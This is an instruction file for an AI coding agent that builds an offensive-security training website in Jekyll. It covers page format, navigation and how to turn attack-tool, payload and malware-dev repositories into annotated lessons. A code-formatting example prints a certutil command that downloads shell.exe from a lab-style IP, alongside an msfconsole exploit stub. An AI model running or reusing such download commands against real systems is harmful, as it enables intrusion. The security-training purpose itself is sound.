# CLAUDE.md

This file provides guidance to Claude Code when working with this repository.

## Repository Layout

```
red-team-academy/
  jekyll-site/          # The active training site — all work happens here
  repo/                 # Source repositories to parse for site content
  old-repo/             # Legacy Astro site — ignore, do not modify
```

## Running the Site

```bash
cd jekyll-site/
jekyll serve            # dev server, usually http://localhost:4000
jekyll build            # static build → _site/
```

If Jekyll is not installed:
```bash
gem install bundler jekyll
bundle install
bundle exec jekyll serve
```

---

## Site Architecture — Jekyll

The site is a **pure Jekyll static site** with a terminal/hacker aesthetic. No JavaScript framework, no build pipeline beyond Jekyll itself.

### Directory Structure

```
jekyll-site/
  _layouts/
    base.html           # global navbar + sidebar + footer, active-link JS
    training-page.html  # extends base: adds notes panel + content slot
  _config.yml           # Jekyll config (permalink: pretty, markdown: kramdown)
  css/styles.css        # global terminal theme — edit here for style changes
  js/main.js            # client-side notes (localStorage, debounced save)
  images/<module>/      # SVG diagrams referenced as /images/<module>/file.svg
  favicon.svg
  index.html            # homepage with module grid
  about.html
  <module>/             # one directory per module
    <page>.html         # one .html file per lesson/topic
```

### Modules and Their Directories

| # | Module | Directory |
|---|--------|-----------|
| 01 | Fundamentals | `fundamentals/` |
| 02 | Reconnaissance | `recon/` |
| 03 | Active Directory | `active-directory/` |
| 04 | Pivoting & Tunneling | `pivoting/` |
| 05 | Evasion | `evasion/` |
| 06 | Exploitation | `exploitation/` |
| 07 | Post-Exploitation | `post-exploitation/` |
| 08 | C2 Frameworks | `c2-frameworks/` |
| 09 | Web Hacking | `web/` |
| 10 | Wireless Attacks | `wireless/` |
| 11 | IoT Hacking | `iot/` |
| 12 | AI Red Team Agents | `ai-agents/` |
| 13 | Red Team Tools | `tools/` |
| 14 | Tool Development | `tool-dev/` |
| 15 | Reporting | `reporting/` |

---

## Page Format

Every training page is a `.html` file with Jekyll front matter:

```html
---
layout: training-page
title: "Topic Name — Red Team Academy"
module: "Module Name"
tags:
  - tag1
  - tag2
page_key: "module-topic-slug"
---
<h1>Topic Name</h1>
  <p>Introduction paragraph.</p>

  <h2>Section</h2>
  <pre><code># Commands and code go here
example command</code></pre>

  <h2>Another Section</h2>
  <pre><code>more code</code></pre>

  <h2>Resources</h2>
  <ul>
    <li>Resource name — <code>github.com/owner/repo</code></li>
  </ul>
```

**Front matter rules:**
- `layout`: always `training-page`
- `title`: `"Topic — Red Team Academy"` (used in `<title>`)
- `module`: matches the module name shown in the sidebar (e.g., `"Exploitation"`)
- `tags`: kebab-case list, relevant to content
- `page_key`: `"module-topic"` pattern, alphanumeric + hyphens only, max 128 chars

**Content rules:**
- All content is plain HTML — no Markdown inside the body
- Code blocks: `<pre><code>...</code></pre>` — no class attributes needed
- HTML entities must be escaped: `&amp;`, `&lt;`, `&gt;`, `&quot;`
- Indentation: 2-space indent inside content, code blocks not indented
- `<h1>` — page title (one per page)
- `<h2>` — major sections
- `<h3>` — subsections within a major section
- No inline styles, no JavaScript per-page (JS goes in `js/main.js`)
- Always end with an `<h2>Resources</h2>` section listing source material

---

## Adding a New Page

1. **Create the file** at `jekyll-site/<module>/<page-name>.html` using the page format above.

2. **Add the nav link** in `jekyll-site/_layouts/base.html`:
   - Find the correct `<details>` block for the module
   - Add `<li><a href="/<module>/<page-name>/">Link Text</a></li>`
   - Use `&amp;` for `&` in link text

3. **No other registration needed** — Jekyll discovers pages automatically.

### Naming Conventions

- File: `kebab-case.html` (e.g., `blind-ssrf.html`, `ad-enumeration.html`)
- URL path: matches file name without extension (Jekyll `permalink: pretty`)
- `page_key`: `module-topic` (e.g., `"web-blind-ssrf"`, `"ad-enumeration"`)

---

## Extending an Existing Page

1. **Read the file first** — always use the Read tool before editing.
2. Add new `<h2>` sections before the `<h2>Resources</h2>` section.
3. Update the Resources list to cite any new source material.
4. Use Edit tool with enough surrounding context to make the match unique.

---

## Sidebar Navigation (`_layouts/base.html`)

The sidebar is hardcoded HTML in `base.html`. Structure:

```html
<details>
  <summary><span class="module-num">NN</span> Module Name</summary>
  <ul>
    <li><a href="/module-dir/page-name/">Page Title</a></li>
  </ul>
</details>
```

JavaScript at the bottom of `base.html` auto-opens the current module's `<details>` and adds `class="active"` to the matching link — no manual work needed.

**When adding a nav link:** place it in the correct module `<details>` block, in a logical reading order (beginner → advanced, broad → specific).

---

## Repo Parsing — Adding Content from `repo/`

The `repo/` directory contains source repositories dropped in by the user for analysis. When instructed to parse a repo and add its content to the site:

### Step 1 — Classify the Repo

Read the README and scan the directory structure to determine what kind of repo it is:

| Type | Description | How to Handle |
|------|-------------|---------------|
| **Reference / taxonomy** | Payloads, wordlists, cheatsheets, attack taxonomies | Extract the most useful data into a new page or extend an existing one |
| **Attack tool** | CLI or library that runs attacks | Analyze how it works, document usage, commands, flags, and workflow on the relevant page |
| **Framework** | Multi-module automation platform | Create a dedicated page or extend methodology pages; cover install, modules, workflows |
| **Code/technique library** | Source code demonstrating techniques (e.g., malware-dev, shellcode samples) | Extract the technique, annotate what the code does, incorporate the code or pseudocode into the relevant page |
| **Low-value / already covered** | Basic tutorials, duplicate of existing content, outdated | Skip — do not add redundant content |

### Step 2 — Determine Placement

Map the repo content to the existing module structure:

- Recon tools / passive enumeration → `recon/`
- Subdomain discovery, web fingerprinting → `recon/`
- Active Directory attacks → `active-directory/`
- Evasion: AV/EDR bypass, obfuscation, process manipulation → `evasion/`
- Windows API, shellcode, malware techniques → `exploitation/` (or `evasion/` if evasion-focused)
- Web vulnerabilities (XSS, SQLi, SSRF, etc.) → `web/`
- C2, implants, post-exploitation → `c2-frameworks/` or `post-exploitation/`
- Fuzzing payloads, wordlists → extend existing pages in `recon/` or `web/`
- AI/LLM security → `ai-agents/`
- CTF / exploit development → `exploitation/`
- Bug bounty automation → extend `web/bug-bounty-methodology.html` or `recon/`
- Wireless / RF / hardware → `wireless/` or `iot/`

**Extend an existing page** when the repo adds depth to a topic already covered (e.g., new SSRF chains on `web/ssrf.html`).
**Create a new page** when the repo introduces a topic not yet covered, or would make an existing page unwieldy.

### Step 3 — Extract the Right Content

For each repo type:

**Reference / taxonomy repos** (payloads, wordlists):
- Do not paste thousands of payloads inline — curate
- Extract the most impactful 10–30 examples
- Explain what each category targets and when to use it
- Reference the full list path (e.g., `/opt/seclists/Fuzzing/XSS/`) for use with ffuf/burp
- Include example ffuf/curl/tool command using the wordlist

**Attack tool repos:**
- Cover: install command, core flags/options, most common usage patterns
- Explain what the tool does internally at a conceptual level (what requests it sends, what it looks for)
- Show realistic attack pipelines (chaining with other tools via pipes)
- If the tool has interesting source code that illustrates the technique, extract and annotate it
- Reference: tool name, GitHub URL in Resources section

**Code / technique repos (malware-dev, shellcode, etc.):**
- Read the source code to understand what it does
- Include the actual code or annotated excerpts if they illustrate a technique clearly
- Explain each significant section with inline comments
- Add compilation/build instructions
- Describe the EDR/detection signals the technique produces
- **Do not improve or augment malware code** — document and explain only

**Framework repos:**
- Cover installation, architecture (what modules exist, how they relate)
- Document the core workflows a user would follow
- Explain configuration options that matter for offensive use
- Note operational security considerations

### Step 4 — Write the Content

Follow the page format strictly. Content quality standards:

- **Commands must be runnable** — no pseudocode in `<pre><code>` blocks unless clearly labeled
- **Be specific** — include real flag names, real file paths, real port numbers
- **Explain the "why"** — describe what a technique does, not just the command
- **Include detection context** — mention what EDR/SIEM signals the technique produces when relevant
- **Show pipelines** — chain commands with pipes to show realistic workflows
- **Curate aggressively** — include what a practitioner would actually use, not everything the tool supports

### Step 5 — Update Navigation

Add the new page(s) to `_layouts/base.html` in the correct module `<details>` block.

---

## Tool Repos — Reference vs. Incorporate

When a repo is an **attack tool**, choose one of these approaches:

### Reference Only
Use when the tool:
- Has a complex or large codebase not worth reproducing
- Is well-known and users would install it from the original repo
- Provides value primarily through its binary/runtime behavior

Document: install command, usage flags, realistic attack pipelines. Add GitHub URL to Resources.

### Incorporate Code
Use when the tool:
- Contains a short, self-contained technique (e.g., a 50-line C++ snippet demonstrating a Windows API trick)
- The code itself teaches the technique (not just the tool's output)
- The code is more valuable annotated and explained than referenced externally
- It would be used as a starting point that the user would modify

Incorporate: paste the code into a `<pre><code>` block, add inline comments explaining each significant section, note the source in Resources.

### Hybrid
Use when the tool has both a useful CLI (reference) and illustrative source code (incorporate). Show usage commands AND annotated source excerpts.

**Example:**
- `pwntools` → Reference (install + API usage, not the library source)
- `cocomelonc malware-dev` → Incorporate (short technique demos in C/C++ are the point)
- `SecLists` → Reference (thousands of wordlists — show paths and example ffuf commands)
- `tomnomnom/hacks` → Incorporate usage (small Go tools — show how they chain together)

---

## Code Block Formatting

All code goes inside `<pre><code>...</code></pre>`. Rules:

```html
<!-- Correct -->
<pre><code>certutil.exe -urlcache -f http://10.10.14.5/shell.exe shell.exe</code></pre>

<!-- Correct — multiline -->
<pre><code># Step 1: enumerate
nmap -sV -p 445 10.10.10.0/24

# Step 2: exploit
msfconsole -q -x "use exploit/..."</code></pre>

<!-- WRONG — do not add class or quote after code -->
<pre><code class="language-bash">...</code></pre>
<pre><code">...</code></pre>
```

HTML special characters inside code blocks **must be escaped**:
- `<` → `&lt;`
- `>` → `&gt;`
- `&` → `&amp;`
- `"` inside attribute values → `&quot;`

Curly braces `{` `}` do not need escaping in HTML (only in Jekyll Liquid templates — avoid `{{ }}` and `{% %}` patterns in code blocks or wrap in `{% raw %}...{% endraw %}`).

---

## Common Mistakes to Avoid

- `<pre><code">` — stray quote after `code`; must be `<pre><code>`
- `<h3">` — stray quote; must be `<h3>`
- Unescaped `&` in link text inside `<a>` tags — use `&amp;`
- Unescaped `<` or `>` in code blocks — use `&lt;` / `&gt;`
- Forgetting to add the nav link in `_layouts/base.html` after creating a new page
- Writing Markdown syntax (## headings, **bold**, `backtick code`) inside HTML pages — use HTML tags only
- Mixing `page_key` formats — always `module-topic` with hyphens, no underscores, no uppercase

---

## Notes System

Notes are stored in `localStorage` in the browser, keyed by `page_key`. The `_layouts/training-page.html` injects a `<textarea>` panel and loads `js/main.js` which handles save/load. No server-side persistence. No API routes needed.

The `page_key` must be unique across all pages. Collision will cause two pages to share the same notes. Convention: `"module-topic"` (e.g., `"exploitation-pwntools"`, `"recon-hacks-tools"`).
